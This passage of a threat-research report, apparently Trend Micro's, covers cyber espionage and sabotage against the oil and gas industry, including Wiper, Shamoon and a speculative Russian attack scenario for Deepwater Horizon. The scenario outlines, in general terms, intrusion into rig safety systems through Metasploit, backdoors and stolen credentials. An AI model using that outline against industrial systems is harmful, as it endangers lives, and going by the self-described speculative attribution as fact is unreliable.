campaigns.The embedding of personal signatures (a la Ugly Gorilla) or the use of passwords like “zw.china” will diminish significantly.If an attacker wished to be more anonymous, it would start to transition to open-source and generic tools exclusively – tools which are common enough that they do not provide significant attribution.Tools like the Metasploit framework provide a high degree of extensibility without offering a significant amount in the way of attribution by tool choice.If not a transition like this, then using tools stolen from other attackers or written in other languages would complicate attribution.The move within the Information Technology world toward more forensically resistant technologies such as SSDs and Cloud Service infrastructures which make attribution and legal jurisdiction much more convoluted will continue to be a catalyst for future attacks alongside services already in use like Dynamic DNS.These cyber espionage attacks are likely the newly established baseline for future cyber conflict within the Oil & Gas Industry.Attacks of this nature and magnitude will continue to originate from places which do not have laws against it or are complicit, including China which has a need to secure oil dominance in the future.However, increasing international pressure will necessitate more covert action, with attackers dispersing their operators or proxies throughout large geographic areas.Non-state actors will likely present APT threats in the future, including State-backed and independent competitors.</section>

<section> 
<heading>Sabotage</heading>
<heading>Middle East, 2012</heading>
	 Another series of events may be connected as well, and while they bear no immediately apparent relationship, closer inspection is suggestive of the possibility of another underlying and ongoing conflict.To understand the context of the exchange, a non-oil-related cyber event must be briefly discussed.A relatively unprecedented cyber-attack came to light in 2010 when the Stuxnet virus hit the uranium enrichment centrifuges in Iran.Iran believes the attack was conducted by Israel or the United States.This attack had targeted the information networks of offshore platforms; however they reported that they were able to defend against the attack.<fn>32</fn> Iran may have thought it was Israel because they had threatened to take military action if the sanctions on Tehran’s banking and oil sectors did not stop Iran from continuing their nuclear program.The attacks targeted Iran’s infrastructure and communications companies, which slowed the Internet in Iran.Israel and the United States have denied being a part of this attack.Then In April of 2012, Iran was again the target of a cyber-attack.Oil Ministry officials reported that the international selling division had not been infected, but it many security vulnerabilities were exposed.Iran is one of the world’s largest oil producers and an attack could affect the market, and raise oil prices globally.<fn>36</fn>

 As with the Stuxnet worm, Iran blamed Israel and the United States for the spread of Wiper.Iranian officials believe they were targeted because of their growing nuclear program.<fn>37</fn> Other affected organizations include the National Iranian Oil Processing and Distribution Company, National Iranian Gas Company, Iranian Offshore Oil Company, Pars Oil and Gas, and other companies controlled by the National Iranian Oil Company.<fn>38</fn> The destruction of this data doesn’t provide much in the way of direct monetary gain for any criminal elements.The real advantage gained by unleashing Wiper is to put pressure on Iran by causing economic loss and reminding them that they are vulnerable.The president of the Tehran World Trade Center, Mohammad Reza Sabzalipour, believes the cyber-attack was indeed a direct message.The aim was to increase pressure so that Iran will compromise in the upcoming nuclear talks on May 23, 2012.He later states, “We are in a bloodless war.If the talks fail, Iran can expect much more of this<fn>39</fn>”.<footnote>
32	 Erdbrink, T., (2012, April 23).Facing Cyberattack, Iranian Officials Disconnect Some Oil Terminals
From Internet.The New York Times.Retrieved from http://www.nytimes.com/2012/04/24/world/middleeast/
iranian-oil-sites-go-offline-amid-cyberattack.html?_r=0
33	 Reuters., (2012, October 08).Cyber attackers target Iranian oil platforms: official.Reuters.Retrieved from 
http://www.reuters.com/article/2012/10/08/us-iran-cyber-idUSBRE8970B820121008
34	 Ibid
35	 Erdbrink, T., (2012, April 23).Facing Cyberattack, Iranian Officials Disconnect Some Oil Terminals
From Internet.The New York Times.Retrieved from http://www.nytimes.com/2012/04/24/world/middleeast/
iranian-oil-sites-go-offline-amid-cyberattack.html?_r=0
36	 Ibid
37	 Ibid
38	 Ibid
39	 Ibid
</footnote>
 <footer>23</footer>

An oil embargo in concert with other economic sanctions by the United States and EU was announced in late 2011 in an effort to discourage any further Iranian nuclear activity.In March of 2012, the Obama administration announced that the market could withstand the embargo of Iranian oil, and raised US-Iran tensions over the issue<fn>40</fn>.Saudi Arabia had also indicated that it would boost oil exports to the US and abroad to compensate for the void that would be left by the sanctions on Iran<fn>41</fn>.As the fifth largest oil producer in the world, the Iranian oil industry accounts for about 20 percent of Iran’s GDP<fn>42</fn>.Both the embargo and the virus represent serious and direct concerns for the Iranian government.Then in August of 2012, only four months after the embargo, a virus named Shamoon struck Saudi Arabian oil giant Aramco.<fn>43</fn> The virus was triggered on a Muslim holiday when most of the company’s employees were absent from work.The name “Wiper” and the shared functionality of the two are somewhat suggestive.Interestingly, a previously unheard of “hacktivist” group identifying themselves as “The Cutting Sword of Justice” took credit for the attack and not a nation state.They claim the virus has given them access to documents on Aramco’s computers, but none have been published yet.<fn>47</fn> The attack was believed to have been assisted by an insider at the company.Another note of significance about Shamoon is that the text “Arabian Gulf” was found in the code which is pertinent because Iran has zealously guarded the title of the region as the “Persian Gulf.<fn>48</fn>”

Although Wiper and Shamoon share a few common characteristics, they are significantly different.Both viruses have been analyzed by Kaspersky Labs who has concluded that although Shamoon contains a wiper function that is designed to overwrite data, it is not as well-designed as Wiper and not near as efficient.<fn>49</fn> The care that was taken by whoever made Wiper to insure it did as much damage as possible in the shortest amount of time is what differentiates it from Shamoon’s wiping feature.Since wiping a disk with hundreds of gigabytes of storage can take an extremely long time, Wiper was designed to target files with certain extensions or in certain folders to do as much irreparable damage as fast as possible.Kaspersky claims that Shamoon was merely a copycat virus that was “the work of script kiddies inspired by the story.”<fn>50</fn> They also claim that Shamoon was probably the work of a non-state group and that Wiper was most likely the product of a nation-state.<fn>51</fn> Even though Shamoon was not on the same level as Wiper, it is still an impressive piece of malware that was able to do damage to important systems.Whether it was the unimpressive work of a nation-state or the work of a skilled group of non-state actors, it made an impact and had an effect on Saudi Aramco.<footnote>
40	 Mathews, C., (2012 Mar.30).Obama moves forward with Iran sanctions despite oil price spike.Re-
trieved from http://blogs.wsj.com/corruption-currents/2012/03/30/obama-moves-forward-with-iran-sanctions-
despite-oil-price-spike/
41	 Flintoff, C., (2012).Sanctions may squeeze Iran…and raise oil prices.NPR.Retrieved from http://www.npr.org/2012/06/30/155993909/sanctions-may-squeeze-iran-and-raise-oil-prices
42	 Katzman, K., (2012 Mar.28).Iran sanctions.Congressional Research Service Report for Congress.Re-
trieved from http://fpc.state.gov/documents/organization/187388.pdf
43	 Perlroth, N., (2012, Oct. 23).In cyberattack on Saudi firm, U.S. sees Iran firing back.The New York
Times.Retrieved from http://www.nytimes.com/2012/10/24/business/global/cyberattack-on-saudi-oil-firm-
disquiets-us.html?pagewanted=all
44	 Ibid
45	 Forbes (2012).The world’s biggest oil companies.Retrieved from http://www.forbes.com/pictures/
mef45ggld/1-saudi-aramco-12-5-million-barrels-per-day/
46	 Encylopedia Britannica, (2013).Aramco.Encyclopedia Britannica.Retrieved from http://www.britan-
nica.com/EBchecked/topic/31594/Aramco
47	 Reuters, (2012, Dec. 9).Aramco says cyberattack was aimed at production.The New York Times.Re-
trieved from http://www.nytimes.com/2012/12/10/business/global/saudi-aramco-says-hackers-took-aim-at-its-
production.html
48	 Perlroth, N., (2012, Oct. 23).In cyberattack on Saudi firm, U.S. sees Iran firing back.The New York
Times.Retrieved from http://www.nytimes.com/2012/10/24/business/global/cyberattack-on-saudi-oil-firm-
disquiets-us.html?pagewanted=all
49	 GReAT-Kaspersky Labs., (2012, Aug. 16).Shamoon the Wiper – Copycats at Work.Securelist.Retrieved
from https://www.securelist.com/en/blog/208193786/Shamoon_the_Wiper_Copycats_at_Work
50	 Ibid
</footnote>

These insights raise the question of whether or not this was an isolated attack by a non-state actor, or whether it was one in an ongoing series of salvos between the Iran and US cyber communities.Iran certainly possessed the motive – retribution for sanctions levied against it, and the cooperation by Saudi Arabia, a Sunni Muslim nation which has been at odds with Shiite Iran before.Typically, however, in an act of retribution the attacker invites attribution which Iran did not.Also, despite causing destructive action to the data on the computers, the virus did not attack the actual control systems and as a result did not manage to damage oil production.The relative crudeness of the code and use of the term “Arabian Gulf” in concert with the insider knowledge of the hacktivist group “The Cutting Sword of Justice” and the use of an Aramco insider to facilitate the attack could suggest that it was simply a singular attack by a non-state actor.Iran’s doctrine is one of asymmetric and proxy warfare.It has been suggested that Iran used unofficial hacker groups such as the “Iranian Cyber Army” to both defend against and engage in attacks<fn>52</fn>.It is possible that “Arabian Gulf” was a red herring intended to further obscure the origin of Shamoon.<fn>53</fn> Using a proxy to launch an attack aligns with Iran’s strategic culture but the exact author is not known.It is possible that Iran did not wish to engage in direct conflict, but intended to make the sanctions less viable by ensuring Aramco would be unable to supply the necessary volume of oil.If this were the case then the attack would show a severe flaw in Iran’s understanding of the oil production systems by not attacking the control systems, instead, which should be unlikely due to Iran’s own expertise in oil production; or it may have been intended to send a message advertising the capability while not crossing a direct line by inflicting significant infrastructure damage.This, however, is pure speculation and not empirically derived analysis.If Iran did in fact orchestrate the Shamoon attack, it would suggest that the series of attacks on Iranian critical infrastructure were followed by retaliation on the American oil supply chain.This would indicate an ongoing and escalating conflict that should be cause for concern.</section>


<footnote>
51	 Ibid
52	 Rezvaniyeh, F., (2010, Feb. 26) Pulling the strings of the net: Iran’s Cyber Army.PBS.Retrieved from
http://www.pbs.org/wgbh/pages/frontline/tehranbureau/2010/02/pulling-the-strings-of-the-net-irans-cyber-
army.html
53	 Perlroth, N., (2012, Oct. 23).In cyberattack on Saudi firm, U.S. sees Iran firing back.The New York
Times.Retrieved from http://www.nytimes.com/2012/10/24/business/global/cyberattack-on-saudi-oil-firm-
disquiets-us.html?pagewanted=all
</footnote>
 <footer>25</footer>

<section> 
<heading>An Incident of Note</heading>
 One incident which appears on the list is singular in that unlike the other noted events it does not appear to be the result of a direct cyber-attack: the Deepwater Horizon oil spill.On April 20th, the culmination of severe neglect of safety protocols and a slew of design and implementation flaws incurred the worst environmental disaster in US history.<fn>54</fn> While drilling the Macondo well in the Gulf of Mexico, the Deepwater Horizon oil rig had a “blowout” in which an uncontrolled mixture of mud and gas was released after failure of pressure control systems.The gas spread across the rig and is believed to have first ignited in the engine room, initiating several explosions and causing the rig to eventually be engulfed in flames and sink.<fn>55</fn> The reason the “Deepwater Horizon” event appears on a list of “cyber-related oil industry events” is because, regardless of the cause, the incident had several failures in networked control and safety systems which could have prevented the catastrophe from occurring after the blowout.These control issues solidify the idea that there was a cyber-component to the catastrophe.When taken into the context of other events which occur in and around the same time period, it becomes clear that though there is no direct evidence pointing to a malign threat actor’s involvement, such an attack is technically viable.It is incredibly unlikely that any state or non-state actor was involved in an attack on the Deepwater Horizon; however the circumstances preclude the exclusion of this possibility, remote though it may be.The Blowout Preventer (BOP) was recovered and forensically examined, but most other evidence cannot be examined – it has either ceased to exist or is inaccessible.The destructive nature of the accident and the apparent corporate neglect makes collecting any cyber-forensic evidence linking the incident to an actor infeasible.Most evidence is destroyed, unusable, or largely inaccessible at the bottom of the ocean.It is likely that any control system audit reports or logs capable of providing insight either would not have attributed anomalous activity to an unidentified APT, or would not be comprehensive enough to provide evidence that could retroactively suggest an APT.Several events that have occurred both before and since the BP oil spill suggest that an attack would be technically feasible.Mario Azar, a disgruntled contractor formerly working for Pacific Energy Resources, sabotaged an offshore oil rig “computer system that PER used to communicate between its offices and its oil platforms.Complicated control system attacks such as Stuxnet have already proven that even in conditions where network access is unavailable, intelligent viruses can still perform a predetermined function at a designated time.By extension of these occurances, it may be concluded that a capable attacker could manipulate safety control systems of an oil rig from shore, and do so through a sophisticated control system virus which can operate even when not in contact with a C2 server.If it is assumed that Deepwater Horizon was an attack, it gives rise to the question of attribution.In order to attribute an attack for which there is no direct or forensic evidence, one must instead turn to political attribution.This includes considering which actors had the motive, means, and the opportunity to perform the attack.Motives can in part be divined through observation of the direct and indirect outcomes of the event and its beneficiaries.After narrowing the scope of actors, one may then examine the policies, strategic culture, operations, and tactics of relevant actors against different dimensions of the event to reveal alignment or correlation.Immediate and direct impacts of the Deepwater Horizon oil spill were as follows:

 - A moratorium on any drilling in the Gulf of Mexico for the ensuing 6 months

 - The Macondo well becoming unusable, at least in the immediate

 - Ecological disaster in the United States and other GoM adjacent countries

 - Heavy political damage, fines, and charges levied against both BP and contractors such as Transocean, Ltd. 

 BP has been by far the biggest figure attached to the incident.As of March 2013 BP has been forced to spend or provision $40 Billion as a result of Deepwater Horizon.<fn>63</fn> To put this in perspective, BP’s combined profits for the years of 2010-2012 amount to about $34.6 billion.<fn>64</fn>

 These impacts in and of themselves are notable, but they also created a ripple effect of indirect consequences as well.These indirect outcomes include the possible fluctuation in oil and gas prices and potential for geopolitical fallout from the ecological disaster.Additionally though, and perhaps most significantly, in 2011 BP announced a $38 billion asset divestment program in order to cover the costs of the enormous fines incurred by the Deepwater Horizon spill.<fn>65</fn> So what did BP divest, and to whom?It is the only one of the top five oil producing countries yet to be mentioned: the Russian Federation.In July of 2012 Forbes released an article on the World’s largest oil companies.Russia, an acknowledged force in cyber and the second largest exporter of oil in the world, is markedly absent in the last decade from the master timeline either as an aggressor or as a target, barring of a few leaked emails by the Anonymous hacking group.This appears aberrant, even despite the possible language barrier mentioned at the beginning of this report or Russia’s tightly controlled dissemination of information.If these benefits alone are not enough, then what other motivators existed which, in concert, would have been cause for Russia to launch a cyber-attack on a UK company operating in the Gulf of Mexico?The figure below displays this in detail, aligned with geopolitical events.The exchange begins in 2006 when the Russian state-run gas company Rosneft went public on the London stock exchange and BP purchased 1 billion in shares.This came on the heels of speculation that Russia wished to “buy out the shareholders of TNK-BP as part of its campaign to tighten control of the country’s energy assets.”<fn>70</fn> In a related vein, the BP-TNK CEO was forced to leave the country after Russian authorities refused to renew his visa.<fn>71</fn> Also in 2008, an important BP incident which did not appear to directly involve Russia occurred.Off the coast of Azerbaijan at the Central Azeri platform in the Caspian Sea, one of BP’s off-shore rigs suffered a blowout nearly identical to that of the Deepwater Horizon.The gas did not ignite, and no one was killed, however it did cost around $50 Million a day in losses for the Azeri government.BP purposefully kept all details of the incident under close wraps verging on a cover-up.Then the Deepwater Horizon event occurs in 2010, followed by the sale of TNK-BP to Russian state-run Rosneft in 2012 as part of the asset divestment program initiated to pay for the spill.In that deal, BP also purchased shares in Rosneft, upping their stake from 1.25% to 20% and receiving two seats on the board of directors, including one which was awarded to BP’s current CEO Robert Dudley—the same gentleman who was forced to flee in 2008 over an un-renewed visa.However, according to a Reuter’s article published on March 4th of this year “…as a state appointee, Dudley would have to vote by government directive on major issues, such as large deals and key appointments.” <fn>72</fn> This remark is in contrast to another individual who had “been nominated as an independent and as such can decide for himself how to vote.” <fn>73</fn>

<figure></figure>

<footnote>
66	 (Kennedy, 2006)
67	 Ibid.68	 (Kramer, 2007)
69	 (Hodgson, 2008)
70	 Ibid.71	 (Webb, 2008)
72	 http://uk.reuters.com/article/2013/03/04/uk-bp-rosneft-idUKBRE92310W20130304?feedType%3DRSS
%26feedName%3DbusinessNews
73	 Ibid.</footnote>
 <footer>29</footer>

These Russia-BP relations coincide with an amalgam of geopolitical events not directly related to BP, but offering supporting context for eventual conclusions drawn about the Deepwater Horizon oil spill.Following the collapse of the Soviet Union in 1991, many of the state owned oil and gas assets were sold at significantly discounted values to private individuals creating an economic void for a fragile new country already plagued by monetary issues in other sectors.Russia faltered economically for most of the 1990’s until Vladimir Putin was elected President in 2000 under a banner of planned economic prosperity.Putin is an interesting figure, and has played prominently in Russia’s return to the world stage.A former KGB member, Putin has sought the consolidation and reclaim of critical sectors of the Russian economy, most notably the energy sector.Using strong-arm tactics and political pressure, he has set the tone for Russia’s future policy.In 2006, Russia temporarily turned off the gas it was supplying to the Ukraine, inciting conflict and unrest with other European countries.The move was cast as an overt attempt to regulate natural resource prices for a market in which Russia controls production and reaps profits from a customer base with limited alternate supply.Russia used the tactic again in 2009, shutting off gas supplies for two weeks to Ukrainian Naftogaz ostensibly because of a dispute over contract terms which had been negotiated in 2002 regarding the appropriation of gas by Naftogas.The ordeal was only resolved after Ukraine’s Prime Minister sat down with Vladimir Putin and renegotiated a new contract for Russian gas, for which she later received a 7 year sentence on charges of abuse of power.These events serve to highlight the importance Russia places on the energy sector as both a vital portion of its economy and a potent political tool.The Russian economy is heavily dependent on the oil & gas industries, with 62.7% of its economy being service based industries in 2010.<fn>74</fn> Many economists have pointed to oil and gas prices as the Achilles heel of the Russian economy.<fn>75</fn><fn>76</fn><fn>77</fn> This was made evident in 2008 when oil prices plummeted (as seen in the figure below), sending the Russian economy spiraling into a recession.Prices hit a low in 2009, one year before Deepwater Horizon and at a time when reports were also stating that the overall output of Russian oil for 2010 was projected to decline.<fn>78</fn> This stagnation in the economy combined with future projections of slowed oil production presented a huge threat to Russia, and it is likely that this sentiment resonated with Russian authorities.As pointed out by a Forbes columnist, a sustained drop in oil prices like that in 2008 would mean possible civil unrest and political instability – oil and gas have that magnitude of effect.<fn>79</fn>

<figure></figure>


 This resonance may perhaps be seen in the Russian National Security Strategy to 2020 published in May of 2009.The document outlines a path for Russia to continue to regain prominent global power, and within it there are several points which lend credence to a strategic view of oil and gas resources.Recasting the Red Star.Fort Leavenworth: Foreign Military Studies Office.,p.87.</footnote>
 <footer>30</footer>


 What follows is a purely speculative narrative of one possible attack scenario, intended to highlight elements of Russian doctrine which align with aspects of the BP oil spill.It will also include techniques and tools which provide functionality that makes such an attack feasible.So it is possible that after the oil price crash in 2008, Russian officials saw the danger to social and political stability in the country.Forecasts for Russian oil output around 2009 also suggested that not only were prices dropping, but overall production would as well, envisaging the specter of future unrest and hardship.Realizing the strategic importance of oil and the success they had garnered with previous market halts, they needed a way to either artificially inflate oil prices, increase demand for Russian oil, or increase oil output.It is worth noting that price of natural gas (another huge component of the Russian economy) is inextricably linked to oil prices in most of Europe during this period because gas is price-indexed against oil.Unlike the natural gas incidents where Russia was able to use state-controlled Gazprom to halt gas leaving the country, a sizeable portion of the oil leaving the country was from privatized companies.It would be difficult to overtly prevent them from exporting without significant backlash from international communities (such as the World Trade Organization where they had been seeking entry for some time), so action would need to be more covert.One of the largest of these private oil firms was TNK-BP, which Russian authorities had already attempted to strong-arm into government control as they had done with other smaller oil companies like Yukos.The other main exporter of oil to Western Europe at this time was BP plc, the 50% owner of TNK-BP.Therefore, control of TNK-BP would both increase oil revenues and state-output, and simultaneously decrease a prime competitor’s overall output.It would also give them a larger political weapon that could be used as a bargaining chip or to meet the aforementioned goal of price control.However, BP had proven recalcitrant and defiant about relinquishing TNK-BP in spite of the pressures which had already been applied.A past rocky relationship with BP combined with their recent safety failures and cover-up in the Caspian Sea also made them a viable target.If they could not be motivated by conventional means, then Russia would have to revert to force as pointed out earlier in their National Security Strategy to 2020 (“the competitive search for resources does not exclude the use of force”).Sabotage could be a viable option, however it would have to be on a large enough scale that BP would be put into a position where they would fold to Russian interests under the additional pressure.While an on-shore explosion would cause some delays in production and potential loss of life leading to litigation, off-shore destruction would have the potential to be significantly more damaging publicly, could also include loss of life, and would incur significant environmental fines in addition to safety fines.The question would then be where to strike – BP holdings in the Caspian Sea would be too dangerous as any failures could easily implicate Russia and any success could cause collateral damage to Russian oil assets and coastal regions.The North Sea would be a potentially viable candidate with multiple countries being affected resulting in more economic impact on BP, however the currents are such that collateral damage could occur to other areas that Russia identified as vital fields of competition, namely the Barents Sea.BP’s other major developments were in relatively new fields in the Gulf of Mexico (GoM) where BP planned to invest heavily.Russia has long seen (and continues to see) American power as a dangerous counter to its own, marking the US as its top global competitor.The GoM then would prove very attractive as it offered a two-fold bonus.A cash-strapped United States, riddled by its own recession, would bear the brunt of the collateral damage resulting in heavy fines to BP, perhaps made heavier because of the state of the American economy.Secondly, BP would possibly lose its asset(s) and right to drill offshore in the GoM, a region BP considered strategic.It would allow for an information influence operation on the American public – poisoning the market against BP, but also potentially against the American government if they repeated any mistakes in their handling of an incident like the 2005 Hurricane Katrina rescue and relief effort.America in 2008 and 2009 was already facing internal contention over deep water drilling practices, meaning that a significant event in the region could perhaps halt production by governmental directive.Even with the contention, BP had already made history in the Gulf; in mid-2009 the Deepwater Horizon rig finished drilling the deepest oil well in history in the Tiber Oil Field off the coast of Texas.This meant that one of the top competitors for Russian oil exports was making headway in this region.America is also the largest importer of oil, so even though oil prices are a complicated affair that takes into account aspects like the economic stability of different regions and future projections of demand, any damaging effects on American production or supply could potentially increase oil prices.<footnote> 
81	 Ibid., p.87.</footnote>

 In March of 2009, drilling of a new well, Macondo, was approved and scheduled to begin later that year, creating an ideal target.Realistically, in a clandestine project of such importance it is likely that Russia would have identified several GoM targets, perhaps alongside BP North Sea assets as well.Having the Gulf of Mexico in mind, Russia now needed a method for delivery.Analyzing the 2008 incident in the Caspian Sea which was still fresh at this time, it may have been noted that one of the root causes of the blowout was a flaw in the concrete—concrete possibly provided by the same US contractor who worked for BP in the GoM: Halliburton.They may have also surmised that if the alarms and safety systems had not activated in the Caspian Sea incident, the crew may not have been capable of reacting quickly enough to prevent an explosion, thus creating a terrible ecological disaster and causing loss of life.So, a workable option appeared to be a covert cyber-attack on rigs operating in the gulf which disabled safety measures or created a situation where a blowout would occur.If done correctly, they could easily hide any attribution behind China (who had been actively stealing secrets from oil companies at this time), a non-state hacking group, a sporadic virus, or merely a glitch/accident.Because of the high stakes involved in any attribution to Russia, the best option would be making it purely appear to be an accident or neglect by BP and its contractors.This could be achieved by playing on known patterns and behaviors by BP that were risky.The type of intelligence Russia would have been intimately familiar with through their own dealings with BP and analysis of other BP safety incident in the recent past.Russian hackers such as the GLEG group have demonstrated proficiency in finding exploits in ICS software by releasing the Agora SCADA+ exploit kit which had a plethora of zero-day exploits in it.<fn>83</fn> This demonstrative proficiency, combined with the previously noted 2009 Mario Azar incident would suggest that the technical capability to set this in motion was readily available.After identifying several targets in the GoM, Russian operators could easily have exploited a multitude of attack vectors.Employee’s personal systems (which could have VPN access to onshore control stations or the rig directly), mobile devices like smart-phones, portable storage devices such as usb drives, engineer laptops, or an onshore control center with access to the rigs could have been leveraged to gain access.Such attacks could be trivially done even with open-source or free tools such as the iconic Metasploit Framework.Metasploit’s custom payload, Meterpreter, for example is capable of residing purely in volatile memory, often leaving few residual traces on persistent storage, if any.After identifying an entry point such as social engineering (perhaps too high profile) or more likely exploitation, Russian operatives could find a series of servers at the onshore control center with a long up-time or that were not regularly updated (and therefore not regularly restarted).The attackers could have leveraged these to create redundant avenues of access which run entirely in volatile memory, thus leaving minimal to no permanent traces.More likely and stable however would be the use of such exploitation to install a persistent backdoor.From here they could have stolen credentials or otherwise escalated privileges to gain access to the safety systems on the Deepwater Horizon and other rigs operating in the area.It is likely that the same attack vector would not have been used in every instance to obscure any pattern analysis and diversify opportunities for success.At this point setting off alarms in the early hours to encourage employees to disable them, impairing other safety systems and causing general instability would have been enough to subtly magnify the effects beyond a manageable level resulting in catastrophe.After having discussed in some detail the possibility of a state actor’s involvement, it must equally be considered that there is also plenty of evidence suggesting that this was nothing more than a tragic incident.It may also be stated that there is evidence contrary to the posed scenario.The Deepwater horizon incident and the 2008 Caspian Sea incident before it were merely two incidents in an industry fraught with others.Additionally, two incidents—regardless of similarity—are not conclusive enough to represent a pattern.Should they be a part of a larger pattern, it is far more likely that these particular incidents pointed to a pattern of corporate neglect than anything else.The inherently dangerous nature of oil refinery work would imply that accidents and loss of life are an unfortunate reality of the industry.According to the Centers for Disease Control and Prevention, “The fatality rate for oil and gas workers in the U.S. between 2002 and 2007 was more than 29 deaths per 100,000 workers, or about seven times the average for all occupations.”<fn>84</fn> BP is no stranger to such hazards.Deepwater Horizon, though perhaps their worst to date, was not their first prolific disaster.BP was required to pay 1.6 billion dollars in victim compensation for the Texas City refinery explosion from March 23, 2005.They were also required to pay 50.6 million dollars in fines for failing to fix the safety violations that were brought to them by OSHA before the explosion.<fn>85</fn> These same corporate failings were present in the Deepwater Horizon incident and were brought up during the senate hearings.This in part serves to highlight the fact that even if the incident were to be a state-sponsored attack, the impact of the loss of a single rig or small well is relatively inconsequential to the overall oil production of the victim.The timeline of the Deepwater Horizon incident also speaks volumes – the incident took place over the course of at least a year and was the product of many budget-saving decisions that were acknowledged to be dangerous by the engineers who were working on the Macondo well drilling effort.These measures and a culture of risk are likely what ultimately sealed the fate of the Deepwater Horizon.These occurrences are too intricate whilst spread over such an extended period of time for any one entity to have reasonably controlled them all.<footnote>
82	 Recasting the Red Star
83	 https://ics-cert.us-cert.gov/pdf/ICSA-11-096-01.pdf
84	 Centers for Disease Control.(2013, March, 3).Retrieved from http://www.cdc.gov/niosh/programs/oil-
gas/risks.html
</footnote>
 <footer>32</footer>

 It is within human nature to look for a pattern or design for an event even when there isn’t any – this can be augmented by time as more possible “clues” become apparent.For this reason such attribution which seeks out a conclusion is a slippery slope and must be approached with caution—it has a tendency to entice analysts to find facts to fit the hypothesis as opposed to a hypothesis which fits the facts.It’s important to remember that correlation does not equal causation; in fact correlation may be coincidental or the result of another unanticipated factor.Likewise the circumstantial evidence alone is not conclusive.Between 1969 and 2005 there have been over 30 separate incidents on oil rigs ranging from fires and explosions, to structural failures, some of which were blowouts not unlike the one that occurred on Deepwater Horizon.</section>


<footnote>
85	 BBC News, BP agrees to pay record 50.6m fine for Texas explosion.(2010, August, 12) http://www.bbc.co.uk/news/business-10960486
</footnote>
 <footer>33</footer>

<section> 
<heading>Conclusion</heading>
 The observation of a moderately sized cross-section of cyber events within the oil and gas industry clearly indicates that there is ongoing cyber conflict.This conflict exists in the form of espionage and sabotage, and it involves both state and non-state actors.In the case of cyber espionage, these actors are advanced in the sense that they have launched multi-year campaigns which have gone undetected as they have exflitrated what is likely untold billions of dollars in intellectual property.There tactics represent a formalization and ritualization of the conflict which will suggests that it has been weaponized and will continue to escalate in the future.The Chinese government is absolutely involved in some capacity, and stands to gain the most out if these transactions.China will need to continue to make aggressive moves to sustain its need for oil going forward as its ability to meet growing demand becomes overwhelmed.Red October, while largely targeted at diplomatic entities, also targeted the oil and gas industry.The sophistication of the infrastructure used in Red October, as well as the methods, suggest a revolution in the type of cyber conflict that will be seen in the oil and gas industry.A majority of these groups are still active as of April 2013, even after being outed in reports released by antivirus and incident response companies over the last few years.These reports themselves represent one aspect in which non-state actors will become ever more important in cyber conflict, particularly within important industries such as oil and gas.American companies are particularly vulnerable targets to state-backed or state-owned foreign competitors who may in the future leverage their countries’ cyber forces to gain competitive advantage, or possible develop their own.This type of competitiveness may lead to the types of sabotage exchanges seen in the Middle East.These attacks may either have been the work of nation-states battling out policy in the cyber realm, or unconnected events with the Shamoon attacks merely being a disaffected hacktivist group expressing dissent.Regardless of origin, these exchanges are clear examples of cyber conflict of a destructive nature.Going forward, the sophistication of the viruses used in these attacks will likely only increase.Attacks like the flame and Stuxnet viruses may be seen by American companies within the industry.The line between espionage and sabotage attacks can be somewhat blurred with viruses being modular and having the capability to perform both; gathering intel while waiting undetected to unleash a more sinister capability.The very use of these types of malware breeds and intimacy and familiarity with them that allows for their further proliferation by the parties who were previously attacked.Even if they cannot reverse engineer them, they may understand the behaviors well enough to crudely mimic them.As discussed at the beginning of the paper, cyber conflict is attractive.It is attractive to criminal elements, corporate elements, individuals, hacktivists, state actors, and other sundry non-state actors alike.Because of its low barrier to entry, availability, and outsized impact, the oil industry must prepare for sustained future conflict in this realm.</section>

<section> 
<heading>Appendix A - Definitions</heading>
Advanced Persistent Threat: An advanced persistent threat (APT) uses multiple phases to break into a network, avoid detection, and harvest valuable information over the long term.These phases are Incursion, Discovery, Capture, and Exfiltration according to Symantec.<fn>86</fn>

Anonymous: A decentralized group of individuals who label themselves as “hactivists.” The individuals are a non-state sponsored group.The group frequently picks their targets based on current events or decisions of companies that conflict with an ever changing mantra of the group.The attacks perpetrated by Anonymous are frequently not complex in nature and often are designed just to restrict access to public websites through a denial of service attack.C2: Command and Control

Cyber Warfare: “Actions by a nation-state to penetrate another nation’s computers or networks for the purposes of causing damage or disruption.“<fn>87</fn>

Dropper virus: A type of Trojan that serves to transport and extract a viral payload onto the destination system.The dropper is frequently made to masquerade as an innocuous executable that once executed the viral payload has been deployed.The dropper service at this point no longer needs to be running.<fn>88</fn>

Exfiltration: The opposite of infiltrate.The act of secretly stealing information from the enemy’s control.It is a form of espionage.Malware: A generic term used to describe software designed to cause malicious actions on a computer system.Trojans, Viruses, and Worms are examples of types of Malware.Reflexive control: “A means of conveying to a partner or an opponent specially prepared information to incline him to voluntarily make the predetermined decision desired by the initiator of the action.”<fn>89</fn>

SCADA: Supervisory control and data acquisition are a type of industrial control system usually deployed to monitor systems over long distances.Spear phishing: The process of attempting, often through email, to acquire someone else’s user information.This is achieved through social engineering and often involves sending emails that appear to be from a known and trusted individual.Trojan: A type of computer malware that does not replicate, rather its primary function is to allow unauthorized access to the computer systems, steal information, or cause harm to the infected system.A Trojan often presents itself as an innocuous file thus tricking the user into executing.Virus: A type of computer malware that is able to self-replicate and infect multiple systems.The replication is usually tied to a human interaction.</section>

<footnote>
86	 http://www.symantec.com/theme.jsp?themeid=apt-infographic-1
87	 Clarke, R A and Knake, R K (2010).CyberWar, the next threat to national security and what to do about it.New
York: Ecco/HarperCollins.88	 Symantec.(2012, April 26).Trojan.Dropper.Retrieved March 9, 2013, from Symantec: http://www.sy-
mantec.com/security_response/writeup.jsp?docid=2002-082718-3007-99
89	 Thomas, T. (2011).Recasting the Red Star.Fort Leavenworth: Foreign Military Studies Office.</footnote>

</doc>It is not intended and should not be construed to constitute legal advice.The information
contained herein may not be applicable to all situations and may not reflect the most
current situation.Nothing contained herein should be relied on or acted upon without the
benefit of legal advice based on the particular facts and circumstances presented and
nothing herein should be construed otherwise.Trend Micro reserves the right to modify
the contents of this document at any time without prior notice.Translations of any material into other languages are intended solely as a convenience.Translation accuracy is not guaranteed nor implied.If any questions arise related to
the accuracy of a translation, please refer to the original language official version of the
document.Any discrepancies or differences created in the translation are not binding and
have no legal effect for compliance or enforcement purposes.Although Trend Micro uses reasonable efforts to include accurate and up-to-date
information herein, Trend Micro makes no warranties or representations of any kind as to
its accuracy, currency, or completeness.You agree that access to and use of and reliance
on this document and the content thereof is at your own risk.Trend Micro disclaims all
warranties of any kind, express or implied.Neither Trend Micro nor any party involved
in creating, producing, or delivering this document shall be liable for any consequence,
loss, or damage, including direct, indirect, special, consequential, loss of business profits,
or special damages, whatsoever arising out of access to, use of, or inability to use, or
